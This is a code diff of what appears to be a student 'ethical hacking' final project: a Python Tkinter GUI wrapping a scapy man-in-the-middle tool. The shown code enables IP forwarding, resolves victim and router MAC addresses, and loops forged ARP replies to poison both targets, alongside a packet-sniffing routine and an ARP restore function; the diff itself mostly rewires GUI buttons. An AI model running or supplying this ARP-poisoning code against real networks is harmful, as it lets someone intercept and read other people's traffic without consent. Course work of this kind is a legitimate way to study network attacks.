@@ -6,22 +6,26 @@ from scapy.layers.http import HTTPRequest
 from scapy.layers.inet import IP
 import iface
 # Ethical Hacking Python Application
+
 # variable declations
 # Elements of the GUI
 # GUI Rigging
 window = Tk()  # create tkinter GUI object
 window.title("Group 1 Final Project")  # Project Title
-window.geometry('500x500')  # Set size of the pane
+window.geometry('560x270')  # Set size of the pane
 
-#Label for number of CPU cores
-labelNo_Of_CPU = Label(window,text="Number of CPU Cores (2,3,6)")
-labelNo_Of_CPU.grid(column=2,row=4)
+# GUI Buttons
+def buttonMitM():
+    masterMitMCall()
+    outputText.insert(END,"MitM Engaged\n")
+def buttonSniffer():
+    outputText.insert(END,"Sniffer Engaged\n")
+def buttonPacketProcessor():
+    outputText.insert(END,"Packet Processor Engaged\n")
+def buttonrestoreARP():
+    outputText.insert(END,"Restore ARP Engaged\n")
 
-#Entry field for number of CPU cores
-textNo_Of_CPU = Entry(window,width=20)
-textNo_Of_CPU.grid(column=3,row=4)
 
-# Get the network resource names
 #Label for number of CPU cores
 labelNo_Of_CPU = Label(window,text="Number of CPU Cores (2,3,6)")
 labelNo_Of_CPU.grid(column=0,row=3)
@@ -54,18 +58,33 @@ labelRouterIP.grid(column=0, row=2)
 entryTextRouterIP = Entry(window, width=20)
 entryTextRouterIP.grid(column=1, row=2)
 
-# function declarations
+def storeVariables():
+    textNo_Of_CPU = entryTextNo_Of_CPU.get()
+    print(textNo_Of_CPU)
+    #store the variable textInterface
+    textInterface = entryTextInterface.get()
+    print(textInterface)
+    #store the variable 
+    textVictimIP = entryTextVictimIP.get()
+    print(textVictimIP)
+    #store the variable textRouterIP
+    textRouterIP = entryTextRouterIP.get()
+    print(textRouterIP)
+    outputText.insert(END,"Input Variables Stored!\n")
+
+
 # MitM Section
-def getNetworkInfo():
-    try:
-        textInterface = input("Enter Interface: ")
-        textVictimIP = input("Enter Victim IP: ")
-        textRouterIP = input("Enter Router IP: ")
-        print("\n[*] IP Fowarding enabled \n")
-        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    except KeyboardInterrupt:
-        print("\n[*] Exiting...")
-        sys.exit(1)
+
+try:
+	textInterface = input("Enter Interface: ")
+	textVictimIP = input("Enter Victim IP: ")
+	textRouterIP = input("Enter Router IP: ")
+except KeyboardInterrupt:
+	print("\n[*] Exiting...")
+	sys.exit(1)
+
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+print("\n[*] IP Fowarding enabled \n")
 
 # send ARP requests
 def get_mac(IP):
@@ -74,6 +93,7 @@ def get_mac(IP):
     iface = textInterface, inter = 0.1)
     for snd, rcv in ans:
         return rcv.sprintf(r"%Ether.src%")
+
 
 # restore ARP
 def restoreARP():
@@ -86,28 +106,31 @@ def restoreARP():
              hwsrc = gatewayMAC), count = 7)
     print("Disabling IP Forwarding")
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-    print("Exiting")
-    sys.exit(1)
+
 
 # ARP reply, switch
 def switch(gatewMAC, vicMAC):
     send(ARP(op = 2, pdst = textVictimIP, psrc = textRouterIP, hwdst = vicMAC))
     send(ARP(op = 2, pdst = textRouterIP, psrc = textVictimIP, hwdst = gatewMAC))
 
+
 # MITM
-def mitm(textVictimIP,textRouterIP):
+
+def mitm():
     try:
         victimMAC = get_mac(textVictimIP)
     except Exception:
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
         print("Victim MAC not found!")
- 
+        print("Exiting")
+        sys.exit(1)
     try:
         gatewayMAC = get_mac(textRouterIP)
     except Exception:
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
         print("Gateway MAC not found")
-
+        print("Exiting")
+        sys.exit(1)
     print("Poisoning Targets!")
     while 1:
         try:
@@ -116,6 +139,8 @@ def mitm(textVictimIP,textRouterIP):
         except KeyboardInterrupt:
             restoreARP()
             break
+
+
 
 # Packet Sniff
 def sniff_packets(iface):
@@ -460,8 +485,8 @@ def storeVariables():
     outputText.insert(END,"Input Variables Stored!\n")
 
 # Button for handling mitm() execute call
-buttonMitM = Button(window, text="MitM", command=mitm(textVictimIP,textRouterIP))
-buttonMitM.grid(column=1, row=4)
+buttonMitM = Button(window, text="MitM", command=buttonMitM)
+buttonMitM.grid(column=2, row=0)
 
 # Button for handling sniff_packets() execute call
 buttonPacketSniffer = Button(window, text="Engage Packet Sniff", command=buttonSniffer)
@@ -479,6 +504,10 @@ buttonRestoreARP.grid(column=2, row=3)
 buttonStoreVariables = Button(window, text= "Store Variables", command=storeVariables)
 buttonStoreVariables.grid(column=2,row=5)
 # Button for closing the application
-buttonClose = Button(window, text="Quit", command="close")
-buttonClose.grid(column=1, row=4)
+buttonClose = Button(window, text="Quit",command=exit)
+buttonClose.grid(column=1, row=10)
+
+outputText = Text(window,height=5,width=35)
+outputText.grid(column=0,row=9)
+
 window.mainloop()  # keeps window open
